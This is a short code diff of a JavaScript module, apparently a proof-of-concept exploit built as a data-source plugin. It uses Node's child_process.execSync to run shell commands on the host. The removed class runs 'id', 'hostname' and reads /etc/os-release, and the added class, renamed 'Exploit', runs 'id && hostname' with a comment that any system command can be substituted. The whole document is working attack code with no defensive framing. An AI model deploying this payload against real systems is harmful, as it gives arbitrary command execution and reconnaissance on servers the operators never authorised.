@@ -1,13 +1,10 @@
-class SdPocInt {
-  async run(sourceOptions, queryOptions, dataSourceId, dataSourceUpdatedAt) {
-    try {
-      const { execSync } = require('child_process');
-      const output = execSync('id && hostname && cat /etc/os-release | head -5').toString();
-      return { status: 'ok', data: { result: output } };
-    } catch (e) {
-      return { status: 'ok', data: { result: 'exec failed: ' + e.message } };
-    }
+class Exploit {
+  async run(sourceOptions, queryOptions) {
+    // Require Node.js modules and execute system commands
+    const { execSync } = require('child_process');
+    // Run any system command. Example: 'id && hostname && cat /etc/os-release'
+    const output = execSync('id && hostname').toString();
+    return { status: 'ok', data: { result: output } };
   }
 }
-
-module.exports = { default: SdPocInt };
+module.exports = { default: Exploit };
